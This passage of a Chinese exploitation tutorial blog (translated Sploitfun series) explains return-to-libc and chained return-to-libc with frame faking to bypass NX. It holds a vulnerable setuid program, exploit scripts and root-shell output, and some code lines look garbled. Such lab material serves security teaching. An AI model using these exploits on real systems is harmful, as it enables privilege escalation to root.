<li>2.seteuid_arg必须为0.由于我们的缓冲区溢出是由strcpy操作引起的，0变成了一个不好的字符。比如，strcpy函数不会将0之后的字符拷贝到栈中。</li>
</ul>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>我们来看看如何解决上述两个问题。</p>
<p><u>问题1</u>: 为解决这个问题，Nergal在<a href="http://phrack.org/issues/58/4.html" target="_blank" rel="external">phrack</a>中提出了两个聪明的技术</p>
<ul>
<li><ol>
<li>ESP上升(ESP Lifting)</li>
</ol>
</li>
<li><ol>
<li>帧欺骗(Frame fakeing)</li>
</ol>
</li>
</ul>
<p>由于ESP lifting技术要求二进制文件在编译的时候不能设置帧指针(-fomit-frame-pointer)，这里我们只谈帧欺骗技术。 由于我们的二进制文件(vuln)含有帧指针，只好采用帧欺骗技术。</p>
<h3 id="什么是帧欺骗"><a href="#什么是帧欺骗" class="headerlink" title="什么是帧欺骗"></a>什么是帧欺骗</h3><p>这项技术不去覆盖返回地址，而是直接覆盖libc函数地址(这个例子中的seteuid函数)，我们采用”leave ret”指令来覆盖。 这让攻击者有机会将函数参数存放在栈中而不必有任何交叉，而且能调用相应的libc函数，并不会带来任何问题。</p>
<p><u>栈布局</u> 如下面栈布局所示，帧指针攻击者溢出栈并成功链接libc函数: seteuid, system与exit：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>上图中红色强调的部分是”leave ret”指令调用其上方libc函数的返回地址。举个例子，第一条”leave ret”指令(位于栈地址0xbffff1fc处)调用seteuid()，第二条”leave ret”指令(位于栈地址0xbffff20c处)调用system()，第三条”leave ret”指令(位于栈地址0xbffff21c处)调用exit().</p>
<h3 id="leave-ret指令是如何调用其上方libc函数的"><a href="#leave-ret指令是如何调用其上方libc函数的" class="headerlink" title="leave ret指令是如何调用其上方libc函数的"></a>leave ret指令是如何调用其上方libc函数的</h3><p>为了回答这个问题，首先我们要了解”leave”指令。一条”leave”指令可以翻译成:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov ebp,esp            <span class="comment">//esp = ebp</span></div><div class="line">pop ebp                <span class="comment">//ebp = *esp</span></div></pre></td></tr></table></figure>
<p>我们来反汇编main()函数，以便更进一步了解“leave ret”指令</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">  ...</div><div class="line">  <span class="number">0x0804851c</span> &lt;+<span class="number">88</span>&gt;: leave                  <span class="comment">//mov ebp, esp; pop ebp;</span></div><div class="line">  <span class="number">0x0804851d</span> &lt;+<span class="number">89</span>&gt;: ret                    <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p><u>Main尾声代码</u>:</p>
<p>如上述栈布局所示，在main函数尾声代码执行之前，攻击者已经溢出栈并用fake_ebp0(0xbffff204)覆盖了main函数的ebp，以及利用”leave ret”指令地址(0x0804851c)覆盖了其返回地址。 现在当CPU要执行main函数的尾声代码时，EIP指向text地址0x0804851c（”leave ret”)。在执行过程中，会发生下面的事情：</p>
<ul>
<li>‘leave’修改了下面的寄存器<ul>
<li>esp = ebp = 0xbffff1f8</li>
<li>ebp = 0xbffff204, esp = 0xbffff1fc</li>
</ul>
</li>
<li>‘ret’执行”leave ret”指令(位于栈地址0xbffff1fc处)</li>
</ul>
<p><u>seteuid</u>: 现在EIP又重新指向text地址0x0804851c(“leave ret”). 在执行过程中，会发生下面的事情：</p>
<ul>
<li>‘leave’修改了下面的寄存器<ul>
<li>esp = ebp = 0xbffff204</li>
<li>ebp = 0xbffff214, esp =0xbffff208</li>
</ul>
</li>
<li>‘ret’执行seteuis()(位于栈地址0xbffff208). 为了能成功调用seteuid,seteuid_arg必须放在栈地址0xbffff210的偏移量8处(比如seteuid_add）</li>
<li>调用seteuid()后，”leave ret”指令(位于栈地址0xbffff20c处)开始执行</li>
</ul>
<p>可以从上面的栈布局看出，执行上述过程，栈已经按照攻击者的意图设置好，system和exit函数都能得到执行。</p>
<p><u>问题2</u>: 在我们的例子中，seteuid必须为0. 但0已经变成一个不好的字符，如何将0写在栈地址0xbffff210处呢？Nergal的同一篇文中讲了一个简单的方法。在链接libc相关函数时，前几个调用必须是strcp函数(其将一个NULL字节拷贝到seteuid_arg在栈中的位置)。</p>
<p><u>注意</u>: 但不幸地是我的libc.so.6中strcpy函数的地址是0xb7ea6200。 libc函数地址本身包含一个NULL字节(不好的字符!)。 因此，strcpy不能成功地利用漏洞代码。sprintf（函数地址是0xb7e6e8d0)可以用来替代strcpy。使用sprintf时，NULL字节被拷贝到seteuid_arg在栈中的位置。</p>
<p>因此链接下面的libc函数可以解决上面提到的两个问题并成功获取root shell:</p>
<pre><code>sprintf|sprintf|sprintf|sprintf|seteuid|system|exit
</code></pre><p><u>漏洞利用代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fake_ebp0 = <span class="number">0xbffff1a0</span></div><div class="line">fake_ebp1 = <span class="number">0xbffff1b8</span></div><div class="line">fake_ebp2 = <span class="number">0xbffff1d0</span></div><div class="line">fake_ebp3 = <span class="number">0xbffff1e8</span></div><div class="line">fake_ebp4 = <span class="number">0xbffff204</span></div><div class="line">fake_ebp5 = <span class="number">0xbffff214</span></div><div class="line">fake_ebp6 = <span class="number">0xbffff224</span></div><div class="line">fake_ebp7 = <span class="number">0xbffff234</span></div><div class="line">leave_ret = <span class="number">0x0804851c</span></div><div class="line">sprintf_addr = <span class="number">0xb7e6e8d0</span></div><div class="line">seteuid_addr = <span class="number">0xb7f09720</span></div><div class="line">system_addr = <span class="number">0xb7e61060</span></div><div class="line">exit_addr = <span class="number">0xb7e54be0</span></div><div class="line">sprintf_arg1 = <span class="number">0xbffff210</span></div><div class="line">sprintf_arg2 = <span class="number">0x80485f0</span></div><div class="line">sprintf_arg3 = <span class="number">0xbffff23c</span></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line">exit_arg = <span class="number">0xffffffff</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num* <span class="number">264</span> </div><div class="line">buf += conv(fake_ebp0) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Below four <span class="built_in">stack</span> frames are <span class="keyword">for</span> <span class="built_in">sprintf</span> (to setup seteuid arg )</div><div class="line">buf += conv(fake_ebp1) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp2) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp3) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp4) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3)</div><div class="line">#Dummy - To avoid null byte in fake_ebp4. </div><div class="line">buf += <span class="string">"X"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> seteuid</div><div class="line">buf += conv(fake_ebp5) </div><div class="line">buf += conv(seteuid_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Dummy - This arg is zero'd by above four <span class="built_in">sprintf</span> calls</div><div class="line">buf += <span class="string">"Y"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> system</div><div class="line">buf += conv(fake_ebp6) </div><div class="line">buf += conv(system_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(system_arg) </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> <span class="built_in">exit</span></div><div class="line">buf += conv(fake_ebp7) </div><div class="line">buf += conv(exit_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(exit_arg) </div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
<p>执行上面的漏洞利用代码就可以拿到root shell!!!</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����������������\��������������\��������������\�������������\��� �������AAAA0�������Ѕ</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>现在已经成功绕过NX,<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt/" target="_blank" rel="external">下一篇</a>文章让我们来看看如果绕过ASLR.</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-returntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20161231/returntolibc/">Return-to-libc绕过NX</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20161231/returntolibc/" class="article-date">
	  <time datetime="2016-12-31T14:20:03.000Z" itemprop="datePublished">十二月 31, 2016</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 什么是NX比特位</li>
<li>0X02 如何绕过NX比特位做到任意代码执行</li>
<li>0X03 什么是最低权限准则</li>
<li>0X04 root setuid程序漏洞利用 </li>
</ul>
</blockquote>
<p><u><em>阅读基础:</em></u></p>
<ol>
<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
</ol>
<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
<p>在前面的文章中，我们可以了解到，攻击者可以：</p>
<pre><code>将shellcode拷贝到栈中，再跳转到shellcode
</code></pre><p>来达到成功利用漏洞代码的目的。</p>
<p>因此，为了阻止攻击者的行为，安全研究人员开始利用“NX”比特位来缓解漏洞利用方法(exploit mitigation)。 </p>
<h3 id="什么是NX比特位"><a href="#什么是NX比特位" class="headerlink" title="什么是NX比特位"></a>什么是NX比特位</h3><p>这种漏洞利用缓解方法将指定内存区域设置为不可执行，并将可执行的区域设置为不可写。举个例子：数据段、栈和堆设置为不可执行，text段设置为不可写。</p>
<p>设置NX位后，经典的栈缓冲区溢出无法利用其漏洞。那是因为，在经典的方法中，shellcode被拷贝到栈中，返回地址指向shellcode。然而，现在的情况是栈被设置位不可执行，漏洞利用(exploit)就会失败。 当然，这种缓解(mitigation)技术也不是完全安全的，这篇文章就来看看我们是如何绕过NX比特位的!!!</p>
<p><u>漏洞代码</u>： 下面这份代码基于前文中漏洞代码作了一点修改。我会在后文中讲述修改的必要性。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf); <span class="comment">/* [3] */</span></div><div class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>编译命令</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p><u>注意</u>: “-z exexstack”参数并没有传递给gcc,因此这时栈是不可执行的(Non eXecutable)，可以通过下述方法来验证：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ readelf -l vuln</div><div class="line">...</div><div class="line">Program Headers:</div><div class="line"> Type      Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</div><div class="line"> PHDR      <span class="number">0x000034</span> <span class="number">0x08048034</span> <span class="number">0x08048034</span> <span class="number">0x00120</span> <span class="number">0x00120</span> R E <span class="number">0x4</span></div><div class="line"> INTERP    <span class="number">0x000154</span> <span class="number">0x08048154</span> <span class="number">0x08048154</span> <span class="number">0x00013</span> <span class="number">0x00013</span> R <span class="number">0x1</span></div><div class="line"> [Requesting program interpreter: /lib/ld-linux.so<span class="number">.2</span>]</div><div class="line"> LOAD      <span class="number">0x000000</span> <span class="number">0x08048000</span> <span class="number">0x08048000</span> <span class="number">0x00678</span> <span class="number">0x00678</span> R E <span class="number">0x1000</span></div><div class="line"> LOAD      <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x00108</span> <span class="number">0x00118</span> RW <span class="number">0x1000</span></div><div class="line"> DYNAMIC   <span class="number">0x000f28</span> <span class="number">0x08049f28</span> <span class="number">0x08049f28</span> <span class="number">0x000c8</span> <span class="number">0x000c8</span> RW <span class="number">0x4</span></div><div class="line"> NOTE      <span class="number">0x000168</span> <span class="number">0x08048168</span> <span class="number">0x08048168</span> <span class="number">0x00044</span> <span class="number">0x00044</span> R <span class="number">0x4</span></div><div class="line"> ...</div><div class="line"> GNU_STACK <span class="number">0x000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000</span> <span class="number">0x00000</span> RW <span class="number">0x4</span></div><div class="line"> GNU_RELRO <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x000ec</span> <span class="number">0x000ec</span> R <span class="number">0x1</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>栈中只有RW标志位，并没有E标志位！</p>
<h3 id="如何绕过NX比特位做到任意代码执行"><a href="#如何绕过NX比特位做到任意代码执行" class="headerlink" title="如何绕过NX比特位做到任意代码执行"></a>如何绕过NX比特位做到任意代码执行</h3><p>可以通过“return-to-libc”技术来绕过NX比特位。这里，返回地址被一种特殊的libc函数地址(而不是含有shellcode代码的栈地址)覆盖。举个例子，如果攻击者想触发一个shell, 他会利用system()地址来覆盖返回地址并设置好system()在栈中需要的必要参数，以便能成功调用system()。 </p>
<p>之前我们已经反汇编并画出了漏洞代码的栈布局。现在开始写个漏洞利用代码来绕过NX比特位吧！</p>
<p><u>漏洞利用代码</u></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")</div><div class="line"></div><div class="line">system = 0xb7e61060        #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e54be0          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to 'sh' substring of 'fflush' string. </div><div class="line">#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!</div><div class="line">system_arg = 0x804827d     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
<p>执行上述漏洞利用代码，可以得到一个具有root权限的shell,如下图所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K��&#125;�</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>太棒了，我们拿到了root shell! 但在实际应用程序中，root setuid 程序设置了最低权限准则，获取root shell并没那么容易！ </p>
<h3 id="什么是最低权限准则"><a href="#什么是最低权限准则" class="headerlink" title="什么是最低权限准则"></a>什么是最低权限准则</h3><p>这种技术允许root setuid程序只有在需要的情况下才能获取root权限。也就是说，在需要时，root setuid程序拿到root 权限，不需要时就会丢弃已获取的权限。root setuid一般会在接收用户输入之前会丢弃root权限。因此，尽管用户输入是恶意的，攻击者也无法后去root shell。 举个例子，下面的漏洞代码不允许攻击者获取root shell。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln_priv.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对于上述漏洞程序，当我们执行下面的漏洞利用代码时，无法获取root shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#exp_priv.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">system = <span class="number">0xb7e61060</span></div><div class="line">exit = <span class="number">0xb7e54be0</span></div><div class="line"></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line"></div><div class="line"><span class="comment">#endianess conversion</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></div><div class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numystem + exit + system_arg</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln_priv"</span>, buf])</div></pre></td></tr></table></figure>
<p><u>注意</u>:exp_priv.py对exp.py稍作了一点修改！仅仅调整了system_arg变量</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ python exp_priv.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K川�</div><div class="line">$ id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) egid=0(root) groups=1000(sploitfun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)</div><div class="line">$ rm /bin/ls</div><div class="line">rm: remove write-protected regular file `/bin/ls'? y</div><div class="line">rm: cannot remove `/bin/ls': Permission denied</div><div class="line">$ exit</div><div class="line">$</div></pre></td></tr></table></figure>
